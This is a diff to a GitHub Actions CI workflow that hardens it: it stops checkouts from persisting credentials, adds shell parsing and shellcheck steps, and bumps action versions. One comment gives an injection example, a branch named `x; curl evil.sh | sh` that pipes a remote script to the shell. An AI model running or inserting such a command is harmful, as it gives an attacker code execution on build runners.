@@ -59,9 +59,13 @@ jobs:
     timeout-minutes: 15
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v5
         with:
           fetch-depth: 0
+          # The token is not needed after checkout: every step below reads the
+          # working tree or git. Leaving the credential in .git/config is how it
+          # ends up inside an uploaded artifact (zizmor: artipacked).
+          persist-credentials: false
 
       - name: Block forbidden files
         run: bash scripts/checks/check-forbidden-files.sh
@@ -181,6 +185,40 @@ jobs:
           done
           echo "Required documentation is present."
 
+      - name: Check documentation links and structure
+        run: bash scripts/checks/check-docs.sh
+
+      # The gate itself is shell. A syntax error in one of these scripts is not
+      # a broken check — it is a check that silently stops running, which is
+      # worse. `bash -n` parses every script without executing it.
+      - name: Parse every shell script (bash -n)
+        run: |
+          mapfile -t scripts < <(bash scripts/ci/shell-scripts.sh)
+          failed=0
+          for script in "${scripts[@]}"; do
+            if ! bash -n "$script"; then
+              echo "::error file=$script::Shell syntax error in $script."
+              failed=1
+            fi
+          done
+          if [ "$failed" -ne 0 ]; then
+            exit 1
+          fi
+          echo "Parsed ${#scripts[@]} shell script(s)."
+
+      # shellcheck is preinstalled on the ubuntu runner image. -S warning is the
+      # level at which findings are real defects rather than style opinions;
+      # -x follows the `source lib/common.sh` directives.
+      - name: Lint shell scripts with shellcheck
+        run: |
+          if ! command -v shellcheck >/dev/null 2>&1; then
+            echo "::notice::shellcheck is not installed on this runner; skipping shell linting."
+            exit 0
+          fi
+          mapfile -t scripts < <(bash scripts/ci/shell-scripts.sh)
+          shellcheck --version
+          shellcheck -S warning -x -f gcc "${scripts[@]}"
+
   # ---------------------------------------------------------------------------
   # Job 2 — Pull-request discipline.
   #
@@ -202,16 +240,28 @@ jobs:
       # by default — a synthetic merge commit GitHub creates for the PR. That
       # makes every linear-history check report a false merge commit, so the
       # head SHA is checked out explicitly instead.
+      #
+      # `fetch-depth: 0` fetches the complete history of every branch, so
+      # `origin/$BASE_REF` is available without a second `git fetch` — which is
+      # what lets the checkout run with `persist-credentials: false`. No
+      # credential is left in .git/config for a later step (or an artifact) to
+      # pick up.
       - name: Checkout the pull-request head
-        uses: actions/checkout@v4
+        uses: actions/checkout@v5
         with:
           fetch-depth: 0
           ref: ${{ github.event.pull_request.head.sha }}
+          persist-credentials: false
 
-      - name: Fetch the base branch
+      - name: Verify the base branch is available
         env:
           BASE_REF: ${{ github.base_ref }}
-        run: git fetch --no-tags --depth=1 origin "+refs/heads/$BASE_REF:refs/remotes/origin/$BASE_REF"
+        run: |
+          if ! git rev-parse --verify --quiet "origin/$BASE_REF" >/dev/null; then
+            echo "::error::The base branch 'origin/$BASE_REF' is not present in the clone, so the commit range cannot be computed. This is a bug in the workflow, not in the contribution."
+            exit 1
+          fi
+          echo "Base branch origin/$BASE_REF is available at $(git rev-parse --short "origin/$BASE_REF")."
 
       # `github.head_ref` is attacker-controlled: a contributor can name a
       # branch `x; curl evil.sh | sh` and GitHub will interpolate it into the
@@ -245,7 +295,7 @@ jobs:
 
       - name: Semantic pull-request title (advisory annotations)
         if: always()
-        uses: amannn/action-semantic-pull-request@v5
+        uses: amannn/action-semantic-pull-request@v6
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         with:
@@ -283,7 +333,9 @@ jobs:
     timeout-minutes: 25
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v5
+        with:
+          persist-credentials: false
 
       - name: Detect application toolchain
         id: detect
@@ -298,7 +350,7 @@ jobs:
 
       - name: Setup Node.js
         if: steps.detect.outputs.app == 'true'
-        uses: actions/setup-node@v4
+        uses: actions/setup-node@v6
         with:
           node-version: ${{ env.NODE_VERSION }}
 
@@ -315,7 +367,7 @@ jobs:
 
       - name: Cache the pnpm store
         if: steps.detect.outputs.app == 'true'
-        uses: actions/cache@v4
+        uses: actions/cache@v6
         with:
           path: ${{ steps.store.outputs.path }}
           key: ${{ runner.os }}-pnpm-store-${{ hashFiles('pnpm-lock.yaml') }}
@@ -342,15 +394,13 @@ jobs:
 
       - name: Type check
         if: steps.detect.outputs.app == 'true'
-        run: |
-          # README documents `pnpm typecheck` while the original workflow used
-          # `type-check`; accept either name so neither convention breaks CI.
-          bash scripts/ci/run-script.sh type-check || bash scripts/ci/run-script.sh typecheck
+        # The alias list is resolved before anything runs: `a || b` would treat a
+        # *failing* type-check exactly like a missing script and go green.
+        run: bash scripts/ci/run-script.sh 'typecheck|type-check'
 
       - name: Format check
         if: steps.detect.outputs.app == 'true'
-        run: |
-          bash scripts/ci/run-script.sh format:check || bash scripts/ci/run-script.sh format --check
+        run: bash scripts/ci/run-script.sh 'format:check|format::--check'
 
       - name: Unit and integration tests
         if: steps.detect.outputs.app == 'true'
@@ -408,7 +458,9 @@ jobs:
     timeout-minutes: 20
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v5
+        with:
+          persist-credentials: false
 
       - name: Detect application toolchain
         id: detect
@@ -422,7 +474,7 @@ jobs:
 
       - name: Setup Node.js
         if: steps.detect.outputs.app == 'true'
-        uses: actions/setup-node@v4
+        uses: actions/setup-node@v6
         with:
           node-version: ${{ env.NODE_VERSION }}
 
